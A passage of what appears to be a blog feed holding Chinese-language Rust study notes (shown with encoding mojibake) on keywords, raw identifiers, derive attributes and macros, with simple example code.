éå†ä¸€ä¸ªè¿­ä»£å™¨æˆ–å®ç°ä¸€ä¸ª trait æˆ–è€…æŒ‡å®šä¸€ä¸ªæ›´é«˜çº§çš„ç”Ÿå‘½å‘¨æœŸ</li><li><code>if</code> - åŸºäºæ¡ä»¶è¡¨è¾¾å¼çš„ç»“æœåˆ†æ”¯</li><li><code>impl</code> - <strong>å®ç°è‡ªæœ‰æˆ– trait åŠŸèƒ½</strong></li><li><code>in</code> - <code>for</code> å¾ªç¯è¯­æ³•çš„ä¸€éƒ¨åˆ†</li><li><code>let</code> - ç»‘å®šä¸€ä¸ªå˜é‡</li><li><code>loop</code> - æ— æ¡ä»¶å¾ªç¯</li><li><code>match</code> - æ¨¡å¼åŒ¹é…</li><li><code>mod</code> - å®šä¹‰ä¸€ä¸ªæ¨¡å—</li><li><code>move</code> - ä½¿é—­åŒ…è·å–å…¶æ‰€æ•è·é¡¹çš„æ‰€æœ‰æƒ</li><li><code>mut</code> - è¡¨ç¤ºå¼•ç”¨ã€è£¸æŒ‡é’ˆæˆ–æ¨¡å¼ç»‘å®šçš„å¯å˜æ€§</li><li><code>pub</code> - è¡¨ç¤ºç»“æ„ä½“å­—æ®µã€<code>impl</code> å—æˆ–æ¨¡å—çš„å…¬æœ‰å¯è§æ€§</li><li><code>ref</code> - é€šè¿‡å¼•ç”¨ç»‘å®š</li><li><code>return</code> - ä»å‡½æ•°ä¸­è¿”å›</li><li><code>Self</code> - <strong>å®šä¹‰æˆ–å®ç° trait çš„ç±»å‹çš„ç±»å‹åˆ«å</strong></li><li><code>self</code> - è¡¨ç¤ºæ–¹æ³•æœ¬èº«æˆ–å½“å‰æ¨¡å—</li><li><code>static</code> - è¡¨ç¤ºå…¨å±€å˜é‡æˆ–åœ¨æ•´ä¸ªç¨‹åºæ‰§è¡ŒæœŸé—´ä¿æŒå…¶ç”Ÿå‘½å‘¨æœŸ</li><li><code>struct</code> - å®šä¹‰ä¸€ä¸ªç»“æ„ä½“</li><li><code>super</code> - è¡¨ç¤ºå½“å‰æ¨¡å—çš„çˆ¶æ¨¡å—</li><li><code>trait</code> - <strong>å®šä¹‰ä¸€ä¸ª trait</strong></li><li><code>true</code> - å¸ƒå°”å­—é¢å€¼ <code>true</code></li><li><code>type</code> - å®šä¹‰ä¸€ä¸ªç±»å‹åˆ«åæˆ–å…³è”ç±»å‹</li><li><code>union</code> - å®šä¹‰ä¸€ä¸ª <a href="https://doc.rust-lang.org/reference/items/unions.html">union</a> å¹¶ä¸”æ˜¯ union å£°æ˜ä¸­å”¯ä¸€ç”¨åˆ°çš„å…³é”®å­—</li><li><code>unsafe</code> - è¡¨ç¤ºä¸å®‰å…¨çš„ä»£ç ã€å‡½æ•°ã€trait æˆ–å®ç°</li><li><code>use</code> - å¼•å…¥å¤–éƒ¨ç©ºé—´çš„ç¬¦å·</li><li><code>where</code> - è¡¨ç¤ºä¸€ä¸ªçº¦æŸç±»å‹çš„ä»å¥</li><li><code>while</code> - åŸºäºä¸€ä¸ªè¡¨è¾¾å¼çš„ç»“æœåˆ¤æ–­æ˜¯å¦è¿›è¡Œå¾ªç¯</li></ul><h3 id="ä¿ç•™åšå°†æ¥ä½¿ç”¨çš„å…³é”®å­—">ä¿ç•™åšå°†æ¥ä½¿ç”¨çš„å…³é”®å­—</h3><p>å¦‚ä¸‹å…³é”®å­—æ²¡æœ‰ä»»ä½•åŠŸèƒ½ï¼Œä¸è¿‡ç”± Rust ä¿ç•™ä»¥å¤‡å°†æ¥çš„åº”ç”¨ã€‚</p><ul><li><code>abstract</code></li><li><code>become</code></li><li><code>box</code></li><li><code>do</code></li><li><code>final</code></li><li><code>macro</code></li><li><code>override</code></li><li><code>priv</code></li><li><code>try</code></li><li><code>typeof</code></li><li><code>unsized</code></li><li><code>virtual</code></li><li><code>yield</code></li></ul></div><h2 id="åŸå§‹æ ‡è¯†ç¬¦">åŸå§‹æ ‡è¯†ç¬¦</h2><div class="story post-story"><p>åŸå§‹æ ‡è¯†ç¬¦ï¼ˆRaw identifiersï¼‰å…è®¸ä½ ä½¿ç”¨é€šå¸¸ä¸èƒ½ä½¿ç”¨çš„å…³é”®å­—ï¼Œå…¶å¸¦æœ‰ <code>r#</code> å‰ç¼€ã€‚</p><p>ä¾‹å¦‚ï¼Œ<code>match</code> æ˜¯å…³é”®å­—ã€‚å¦‚æœå°è¯•ç¼–è¯‘å¦‚ä¸‹ä½¿ç”¨ <code>match</code> ä½œä¸ºåå­—çš„å‡½æ•°ï¼š</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">match</span><span class="token punctuation">(</span>needle<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">,</span> haystack<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>    haystack<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>needle<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>ä¼šå¾—åˆ°è¿™ä¸ªé”™è¯¯ï¼š</p><pre class="language-text" data-language="text"><code class="language-text">error: expected identifier, found keyword `match` --> src/main.rs:4:4  |4 | fn match(needle: &amp;str, haystack: &amp;str) -> bool &#123;  |    ^^^^^ expected identifier, found keyword</code></pre><p>è¯¥é”™è¯¯è¡¨ç¤ºä½ ä¸èƒ½å°†å…³é”®å­— <code>match</code> ç”¨ä½œå‡½æ•°æ ‡è¯†ç¬¦ã€‚ä½ å¯ä»¥ä½¿ç”¨åŸå§‹æ ‡è¯†ç¬¦å°† <code>match</code> ä½œä¸ºå‡½æ•°åç§°ä½¿ç”¨ï¼š</p><p>æ–‡ä»¶å: src/main.rs</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">r</span>#<span class="token keyword">match</span><span class="token punctuation">(</span>needle<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">,</span> haystack<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>    haystack<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>needle<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span>r#<span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token string">"foobar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æ­¤ä»£ç ç¼–è¯‘æ²¡æœ‰ä»»ä½•é”™è¯¯ã€‚æ³¨æ„ <code>r#</code> å‰ç¼€éœ€åŒæ—¶ç”¨äºå‡½æ•°åå®šä¹‰å’Œ <code>main</code> å‡½æ•°ä¸­çš„è°ƒç”¨ã€‚</p><p>åŸå§‹æ ‡è¯†ç¬¦å…è®¸ä½¿ç”¨ä½ é€‰æ‹©çš„ä»»ä½•å•è¯ä½œä¸ºæ ‡è¯†ç¬¦ï¼Œå³ä½¿è¯¥å•è¯æ°å¥½æ˜¯ä¿ç•™å…³é”®å­—ã€‚ æ­¤å¤–ï¼ŒåŸå§‹æ ‡è¯†ç¬¦å…è®¸ä½ ä½¿ç”¨ä»¥ä¸åŒäºä½ çš„ crate ä½¿ç”¨çš„ Rust ç‰ˆæœ¬ç¼–å†™çš„åº“ã€‚æ¯”å¦‚ï¼Œ<code>try</code> åœ¨ 2015 edition ä¸­ä¸æ˜¯å…³é”®å­—ï¼Œè€Œåœ¨ 2018 edition åˆ™æ˜¯ã€‚æ‰€ä»¥å¦‚æœç”¨ 2015 edition ç¼–å†™çš„åº“ä¸­å¸¦æœ‰ <code>try</code> å‡½æ•°ï¼Œåœ¨ 2018 edition ä¸­è°ƒç”¨æ—¶å°±éœ€è¦ä½¿ç”¨åŸå§‹æ ‡è¯†ç¬¦è¯­æ³•ï¼Œåœ¨è¿™é‡Œæ˜¯ <code>r#try</code>ã€‚æœ‰å…³ç‰ˆæœ¬çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§<a href="https://kaisery.github.io/trpl-zh-cn/appendix-05-editions.html">é™„å½• E</a>.</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Rust </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rustå­¦ä¹ 3-æ´¾ç”Ÿ-Derive</title>
      <link href="/posts/d76d00f/"/>
      <url>/posts/d76d00f/</url>
      
        <content type="html"><![CDATA[<h2 id="æ´¾ç”Ÿ">æ´¾ç”Ÿ</h2><div class="story post-story"><p>é€šè¿‡ <code>#[derive]</code> <a href="https://rustwiki.org/zh-CN/rust-by-example/attribute.html">å±æ€§</a>ï¼Œç¼–è¯‘å™¨èƒ½å¤Ÿæä¾›æŸäº› trait çš„åŸºæœ¬å®ç°ã€‚å¦‚æœéœ€è¦æ›´å¤æ‚çš„è¡Œä¸ºï¼Œè¿™äº› trait ä¹Ÿå¯ä»¥æ‰‹åŠ¨å®ç°ã€‚</p><p>ä¸‹é¢æ˜¯å¯ä»¥è‡ªåŠ¨æ´¾ç”Ÿçš„ traitï¼š</p><ul><li>æ¯”è¾ƒ trait: <a href="https://rustwiki.org/zh-CN/std/cmp/trait.Eq.html"><code>Eq</code></a>, <a href="https://rustwiki.org/zh-CN/std/cmp/trait.PartialEq.html"><code>PartialEq</code></a>, <a href="https://rustwiki.org/zh-CN/std/cmp/trait.Ord.html"><code>Ord</code></a>, <a href="https://rustwiki.org/zh-CN/std/cmp/trait.PartialOrd.html"><code>PartialOrd</code></a><ul><li>Eqï¼š<a href="https://en.wikipedia.org/wiki/Equivalence_relation">å®Œå…¨ç­‰ä»·å…³ç³»</a></li><li>PartialEqï¼š <a href="https://en.wikipedia.org/wiki/Partial_equivalence_relation">éƒ¨åˆ†ç­‰ä»·å…³ç³»</a></li><li>Ordï¼š<a href="https://en.wikipedia.org/wiki/Total_order">å…¨åºå…³ç³»</a></li><li>PartialOrdï¼šæ¯”è¾ƒæ’åºé¡ºåºçš„å€¼</li></ul></li><li><a href="https://rustwiki.org/zh-CN/std/clone/trait.Clone.html"><code>Clone</code></a>, ç”¨æ¥ä» <code>&amp;T</code> åˆ›å»ºå‰¯æœ¬ <code>T</code>ã€‚</li><li><a href="https://rustwiki.org/zh-CN/core/marker/trait.Copy.html"><code>Copy</code></a>ï¼Œä½¿ç±»å‹å…·æœ‰ â€œå¤åˆ¶è¯­ä¹‰â€ï¼ˆcopy semanticsï¼‰è€Œé â€œç§»åŠ¨è¯­ä¹‰â€ï¼ˆmove semanticsï¼‰ã€‚</li><li><a href="https://rustwiki.org/zh-CN/std/hash/trait.Hash.html"><code>Hash</code></a>ï¼Œä» <code>&amp;T</code> è®¡ç®—å“ˆå¸Œå€¼ï¼ˆhashï¼‰ã€‚</li><li><a href="https://rustwiki.org/zh-CN/std/default/trait.Default.html"><code>Default</code></a>, åˆ›å»ºæ•°æ®ç±»å‹çš„ä¸€ä¸ªç©ºå®ä¾‹ã€‚</li><li><a href="https://rustwiki.org/zh-CN/std/fmt/trait.Debug.html"><code>Debug</code></a>ï¼Œä½¿ç”¨ <code>&#123;:?&#125;</code> formatter æ¥æ ¼å¼åŒ–ä¸€ä¸ªå€¼ã€‚</li></ul><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// `Centimeters`ï¼Œå¯ä»¥æ¯”è¾ƒçš„å…ƒç»„ç»“æ„ä½“</span><span class="token attribute attr-name">#[derive(PartialEq, PartialOrd)]</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Centimeters</span><span class="token punctuation">(</span><span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// `Inches`ï¼Œå¯ä»¥æ‰“å°çš„å…ƒç»„ç»“æ„ä½“</span><span class="token attribute attr-name">#[derive(Debug)]</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Inches</span><span class="token punctuation">(</span><span class="token keyword">i32</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">impl</span> <span class="token class-name">Inches</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">to_centimeters</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Centimeters</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token operator">&amp;</span><span class="token class-name">Inches</span><span class="token punctuation">(</span>inches<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">;</span>        <span class="token class-name">Centimeters</span><span class="token punctuation">(</span>inches <span class="token keyword">as</span> <span class="token keyword">f64</span> <span class="token operator">*</span> <span class="token number">2.54</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// `Seconds`ï¼Œä¸å¸¦é™„åŠ å±æ€§çš„å…ƒç»„ç»“æ„ä½“</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Seconds</span><span class="token punctuation">(</span><span class="token keyword">i32</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> _one_second <span class="token operator">=</span> <span class="token class-name">Seconds</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// æŠ¥é”™ï¼š`Seconds` ä¸èƒ½æ‰“å°ï¼›å®ƒæ²¡æœ‰å®ç° `Debug` trait</span>    <span class="token comment">//println!("One second looks like: &#123;:?&#125;", _one_second);</span>    <span class="token comment">// è¯•ä¸€è¯• ^ å–æ¶ˆæ­¤è¡Œæ³¨é‡Š</span>    <span class="token comment">// æŠ¥é”™ï¼š`Seconds`ä¸èƒ½æ¯”è¾ƒï¼›å®ƒæ²¡æœ‰å®ç° `PartialEq` trait</span>    <span class="token comment">//let _this_is_true = (_one_second == _one_second);</span>    <span class="token comment">// è¯•ä¸€è¯• ^ å–æ¶ˆæ­¤è¡Œæ³¨é‡Š</span>    <span class="token keyword">let</span> foot <span class="token operator">=</span> <span class="token class-name">Inches</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"One foot equals &#123;:?&#125;"</span><span class="token punctuation">,</span> foot<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> meter <span class="token operator">=</span> <span class="token class-name">Centimeters</span><span class="token punctuation">(</span><span class="token number">100.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> cmp <span class="token operator">=</span>        <span class="token keyword">if</span> foot<span class="token punctuation">.</span><span class="token function">to_centimeters</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> meter <span class="token punctuation">&#123;</span>            <span class="token string">"smaller"</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token string">"bigger"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"One foot is &#123;&#125; than one meter."</span><span class="token punctuation">,</span> cmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></div><h2 id="å±æ€§">å±æ€§</h2><div class="story post-story"><p>å±æ€§æ˜¯åº”ç”¨äºæŸäº›æ¨¡å—ã€crate æˆ–é¡¹çš„å…ƒæ•°æ®ï¼ˆmetadataï¼‰ã€‚è¿™å…ƒæ•°æ®å¯ä»¥ç”¨æ¥ï¼š</p><ul><li><a href="https://rustwiki.org/zh-CN/rust-by-example/attribute/cfg.html">æ¡ä»¶ç¼–è¯‘ä»£ç </a></li><li><a href="https://rustwiki.org/zh-CN/rust-by-example/attribute/crate.html">è®¾ç½® crate åç§°ã€ç‰ˆæœ¬å’Œç±»å‹ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶æˆ–åº“ï¼‰</a></li><li>ç¦ç”¨ <a href="https://en.wikipedia.org/wiki/Lint_(software)">lint</a> ï¼ˆè­¦å‘Šï¼‰</li><li>å¯ç”¨ç¼–è¯‘å™¨çš„ç‰¹æ€§ï¼ˆå®ã€å…¨å±€å¯¼å…¥ï¼ˆglob importï¼‰ç­‰ï¼‰</li><li>é“¾æ¥åˆ°ä¸€ä¸ªé Rust è¯­è¨€çš„åº“</li><li>æ ‡è®°å‡½æ•°ä½œä¸ºå•å…ƒæµ‹è¯•</li><li>æ ‡è®°å‡½æ•°ä½œä¸ºåŸºå‡†æµ‹è¯•çš„æŸä¸ªéƒ¨åˆ†</li></ul><p>å½“å±æ€§ä½œç”¨äºæ•´ä¸ª crate æ—¶ï¼Œå®ƒä»¬çš„è¯­æ³•ä¸º <code>#![crate_attribute]</code>ï¼Œå½“å®ƒä»¬ç”¨äºæ¨¡å— æˆ–é¡¹æ—¶ï¼Œè¯­æ³•ä¸º <code>#[item_attribute]</code>ï¼ˆæ³¨æ„å°‘äº†æ„Ÿå¹å· <code>!</code>ï¼‰ã€‚</p><p>å±æ€§å¯ä»¥æ¥å—å‚æ•°ï¼Œæœ‰ä¸åŒçš„è¯­æ³•å½¢å¼ï¼š</p><ul><li><code>#[attribute = &quot;value&quot;]</code></li><li><code>#[attribute(key = &quot;value&quot;)]</code></li><li><code>#[attribute(value)]</code></li></ul><p>å±æ€§å¯ä»¥å¤šä¸ªå€¼ï¼Œå®ƒä»¬å¯ä»¥åˆ†å¼€åˆ°å¤šè¡Œä¸­ï¼š</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[attribute(value, value2)]</span><span class="token attribute attr-name">#[attribute(value, value2, value3,            value4, value5)]</span></code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Rust </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rustå­¦ä¹ 2-å®ä¸å…ƒç¼–ç¨‹</title>
      <link href="/posts/7af06751/"/>
      <url>/posts/7af06751/</url>
      
        <content type="html"><![CDATA[<h1>Rustå­¦ä¹ 2-å®ä¸å…ƒç¼–ç¨‹</h1><blockquote><p>2022-02-04-</p></blockquote><p>[TOC]</p><h2 id="ä»€ä¹ˆæ˜¯å…ƒç¼–ç¨‹">ä»€ä¹ˆæ˜¯å…ƒç¼–ç¨‹</h2><div class="story post-story"><blockquote><p>å…ƒç¼–ç¨‹æ˜¯æŒ‡æŸç±»[è®¡ç®—æœºç¨‹åº]çš„ç¼–å†™ï¼Œè¿™ç±»è®¡ç®—æœºç¨‹åºç¼–å†™æˆ–è€…æ“çºµå…¶ä»–ç¨‹åº(æˆ–è€…è‡ªèº«)ä½œä¸ºå®ƒä»¬çš„æ•°æ®ï¼Œæˆ–è€…åœ¨[è¿è¡Œæ—¶]å®Œæˆéƒ¨åˆ†æœ¬åº”åœ¨[ç¼–è¯‘æ—¶]å®Œæˆçš„å·¥ä½œã€‚ <strong>å…ƒç¼–ç¨‹</strong>æ˜¯ç”¨æ¥äº§ç”Ÿä»£ç çš„ç¨‹åºï¼Œæ“çºµä»£ç çš„ç¨‹åºï¼Œåœ¨è¿è¡Œæ—¶åˆ›å»ºå’Œä¿®æ”¹ä»£ç è€Œéç¼–ç¨‹æ—¶ï¼Œè¿™ç§ç¨‹åºå«åšå…ƒç¨‹åºã€‚è€Œç¼–å†™è¿™ç§ç¨‹åºå°±å«åšå…ƒç¼–ç¨‹ã€‚</p></blockquote><p>å…ƒç¼–ç¨‹æ˜¯ä¸€ç§ç¼–ç¨‹æŠ€æœ¯,ç¼–å†™èƒ½å¤Ÿç”Ÿäº§æ–°ä»£ç çš„ä»£ç ,æ ¹æ®è¯­è¨€çš„ä¸åŒ,å®ç°çš„æ–¹å¼æœ‰ä¸¤ç§: åœ¨è¿è¡Œæ—¶ç¼–è¯‘å’Œåœ¨ç¼–è¯‘æœŸ.</p><p>è¿è¡Œæ—¶å…ƒç¼–ç¨‹å¯ç”¨äºåŠ¨æ€è¯­è¨€: ä¾‹å¦‚python,JavaScript,Lisp.</p><p>ç¼–è¯‘å‹è¯­è¨€ä¸å¯èƒ½åœ¨è¿è¡Œæ—¶ç”ŸæˆæŒ‡ä»¤,æ‰§è¡Œç¨‹åºé¢„ç¼–è¯‘.</p><p>Rustæä¾›ç¼–è¯‘æœŸä»£ç ç”ŸæˆåŠŸèƒ½,</p><p>Rustå®ä¸ä¼šä»æ‰§è¡Œç¯å¢ƒä¸­æ•è·å˜é‡</p></div><h2 id="Rustä¸­çš„å®åŠå…¶ç±»å‹">Rustä¸­çš„å®åŠå…¶ç±»å‹</h2><div class="story post-story"><p>Rustå®æ—¶åœ¨æŠ½è±¡è¯­æ³•æ ‘æ„é€ çš„ç¬¬äºŒé˜¶æ®µç»“æŸæ—¶è§£æçš„, è¿›è¡Œåç§°è§£æçš„é˜¶æ®µ, åç§°è§£ææ—¶åœ¨ä½œç”¨åŸŸä¸­æŸ¥æ‰¾åœ¨è¡¨è¾¾å¼ä¸­å®šä¹‰çš„å˜é‡æ˜¯å¦å­˜åœ¨çš„é˜¶æ®µ.</p><p>Rustå®èƒ½å¤Ÿè¯†åˆ«ä¸Šä¸‹æ–‡,å¹¶æ ¹æ®å®æ‰©å±•å“åº”çš„å†…å®¹,</p><p>å¸¸è§çš„å®å°±æ˜¯<code>println!</code> , å…è®¸æˆ‘ä»¬å‘<code>println</code>å®ä¼ é€’å°½å¯èƒ½å¤šçš„å‚æ•°. Rustä¸æ”¯æŒä¼ é€’å‡½æ•°çš„å¯å˜å‚æ•°.</p><blockquote><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// é»˜è®¤ç”¨æ³•,æ‰“å°Display</span><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;:o&#125;"</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// å…«è¿›åˆ¶</span><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;:x&#125;"</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// åå…­è¿›åˆ¶ å°å†™</span><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;:X&#125;"</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// åå…­è¿›åˆ¶ å¤§å†™</span><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;:p&#125;"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// æŒ‡é’ˆ</span><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;:b&#125;"</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// äºŒè¿›åˆ¶</span><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;:e&#125;"</span><span class="token punctuation">,</span> <span class="token number">10000f32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// ç§‘å­¦è®¡æ•°(å°å†™)</span><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;:E&#125;"</span><span class="token punctuation">,</span> <span class="token number">10000f32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// ç§‘å­¦è®¡æ•°(å¤§å†™)</span><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;:?&#125;"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// æ‰“å°Debug</span><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;:#?&#125;"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">,</span> <span class="token string">"test2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// å¸¦æ¢è¡Œå’Œç¼©è¿›çš„Debugæ‰“å° è¾“å‡ºéåŸºæœ¬ç±»å‹çš„ç±»JSONæ ¼å¼çš„å€¼</span><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;a&#125; &#123;b&#125; &#123;b&#125;"</span><span class="token punctuation">,</span> a <span class="token operator">=</span> <span class="token string">"x"</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token string">"y"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// å‘½åå‚æ•°</span></code></pre></blockquote><h3 id="å®çš„ç±»å‹">å®çš„ç±»å‹</h3><ul><li>å£°æ˜å®ï¼ˆDeclarative Macroï¼‰ ä½¿ç”¨<code>macro_rules!</code>å®åˆ›å»º</li><li>è¿‡ç¨‹å®ï¼ˆProcedural Macroï¼‰ æ›´é«˜çº§å½¢å¼,å®Œå…¨æ§åˆ¶ä»£ç çš„æ“ä½œå’Œç”Ÿæˆ.</li></ul><p>å£°æ˜å®ï¼ˆDeclarative Macroï¼‰å’Œè¿‡ç¨‹å®ï¼ˆProcedural Macroï¼‰ã€‚å‰è€…æŒ‡çš„æ˜¯ç”¨æŸç§è¯­æ³•ç›´æ¥å£°æ˜å‡ºçš„å®ã€‚åè€…æ˜¯å¯¹åº”ç›´æ¥ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘çš„è¿‡ç¨‹çš„å®ã€‚ç›´è§‰ä¸Šè¿‡ç¨‹å®æ›´éšå¼ï¼Œæ›´å…¨èƒ½ï¼›å£°æ˜å®æ›´å¯è¯»ï¼Œæ›´ç›´æ¥ã€‚</p><p>ç¼–å†™ä¸€ä¸ªå£°æ˜å®,å®ä¾‹:</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span></span>io<span class="token punctuation">;</span><span class="token comment">// å®šä¹‰ä¸€ä¸ªè¾“å…¥å®</span><span class="token macro property">macro_rules!</span> scanline <span class="token punctuation">&#123;</span>    <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">:</span><span class="token fragment-specifier punctuation">expr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token namespace">io<span class="token punctuation">::</span></span><span class="token function">stdin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read_line</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> input <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">scanline!</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">" read &#123;:?&#125;"</span><span class="token punctuation">,</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿‡ç¨‹å®(Procedural Macroï¼‰:</p><ul><li>è‡ªå®šä¹‰ <code>#[derive]</code> å®åœ¨ç»“æ„ä½“å’Œæšä¸¾ä¸ŠæŒ‡å®šé€šè¿‡ <code>derive</code> å±æ€§æ·»åŠ çš„ä»£ç ,åœ¨å‡½æ•°ä¸Šä½¿ç”¨<code>#[proc_macro_derive]</code>å±æ€§,</li><li>ç±»å±æ€§ï¼ˆAttribute-likeï¼‰å®å®šä¹‰å¯ç”¨äºä»»æ„é¡¹çš„è‡ªå®šä¹‰å±æ€§, åœ¨å‡½æ•°ä¸Šä½¿ç”¨<code>#[proc_macro_attribute]</code>å±æ€§,</li><li>ç±»å‡½æ•°å®çœ‹èµ·æ¥åƒå‡½æ•°ä¸è¿‡ä½œç”¨äºä½œä¸ºå‚æ•°ä¼ é€’çš„ token, åœ¨å‡½æ•°ä¸Šä½¿ç”¨<code>#[proc_macro]</code>å±æ€§,</li></ul><h3 id="æ ‡å‡†åº“ä¸­çš„å†…ç½®å®">æ ‡å‡†åº“ä¸­çš„å†…ç½®å®</h3><ul><li><code>dbg!</code>: 